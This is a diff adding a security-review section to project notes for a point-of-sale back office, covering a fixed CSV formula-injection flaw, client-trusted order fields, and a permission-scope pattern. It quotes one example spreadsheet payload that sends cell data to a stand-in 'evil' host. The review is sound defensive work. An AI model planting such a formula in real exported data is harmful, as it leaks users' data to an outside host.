@@ -165,6 +165,51 @@ Two things flagged earlier as "unverified claims" were genuinely tested, not jus
   reading order records for sales reporting (read-only), and never writes to BRYAN POS's tables at
   all.
 
+## Security review (performed, not skipped)
+
+A 3-pass review (identify → independently verify each candidate → filter anything below 8/10
+confidence as a false positive) of the full diff from the base of this branch (`81443cf`) to the
+latest commit, via the `security-review` skill. One real, fixed finding; two candidates investigated
+and correctly filtered out.
+
+- **Fixed — CSV formula injection (MEDIUM, confirmed 8/10).** `api/order.js`'s checkout endpoint is
+  public and never overwrites a cart line's `name`/`category`. `reports.js`'s sales-by-product/
+  category/COGS rows carry that value verbatim, and `backoffice.html`'s `exportCSV()` only
+  quote-doubled cells — a name like `=HYPERLINK("http://evil/?"&A1,"x")` would reach a manager's
+  spreadsheet as a live formula after Export CSV. Fixed: any cell starting with `=`, `+`, `-`, `@`, or
+  a tab now gets a leading `'` before quoting, the standard mitigation — verified in a real browser
+  that the fix actually neutralizes all four leading characters while leaving normal values untouched.
+- **Fixed anyway, despite not clearing the security bar — client-trusted `storeId`/`productKey`
+  (filtered at 3/10 as a security finding; real bug, fixed as a data-integrity issue).** Two gaps in
+  Phase 8's attribution code, both closed:
+  - A delivery order's `o.delivery` object is spread from client input; when the road-distance quote's
+    fallback path fires (no branch resolved), nothing overwrote a client-supplied `delivery.branch`,
+    so a forged branch id could reach `storeId` — contradicting that code's own "never guessed"
+    comment. Fixed by resolving the branch into a variable set only from the server's own quote,
+    never read back from `o.delivery`.
+  - `item.id` was trusted as `productKey` with no check against the real catalogue. Fixed: `productKey`
+    now only accepts a client-supplied `id` after confirming it matches a real product in `getMenu()`;
+    otherwise it falls through to the existing name-matching lookup, same as before.
+  - Why this didn't qualify as a security finding: no auth boundary is crossed and no cross-customer
+    data is exposed — a customer could only ever mislabel their *own* order's internal reporting
+    metadata, with zero effect on real inventory (the stock ledger is staff-entered, never derived
+    from `o.storeId`). Fixed anyway since it's cheap and internal reports should never trust
+    unvalidated client input regardless of blast radius. 3 new tests in
+    `tests/backoffice-order-attribution.test.js` cover a forged `delivery.branch` and a forged
+    `item.id`, alongside the pre-existing legitimate-id case.
+- **Investigated, correctly not a new issue — `dashboard`/`reports` gated only by the broad
+  `dashboard` scope (filtered at 3/10).** Every part-time/kitchen role holds `dashboard`, and
+  `/api/backoffice/reports` (cogs, stock-value, waste-costs, staff-activity) and
+  `/api/backoffice/dashboard` check only that one scope, more loosely than most other new BackOffice
+  endpoints. Verified this is a pre-existing pattern, not something this diff introduced: `api/sales.js`
+  on `main` already let any `dashboard`-holding role reach customer PII and the full debt list via a
+  `?dashboard=1` downgrade, before this branch existed. This diff extends an already-accepted trust
+  boundary to new data; worth a conscious least-privilege decision later, not a vulnerability to patch
+  now.
+
+Full suite: 201/201 passing after both fixes (198 → +3 new attribution tests). No backend logic
+outside `api/order.js`'s attribution block and `backoffice.html`'s `exportCSV()` changed.
+
 ## Known risks / remaining gaps (documented, not hidden)
 
 1. **Thai cannabis compliance fields are not implemented** — `THAI_CANNABIS_COMPLIANCE.md` is
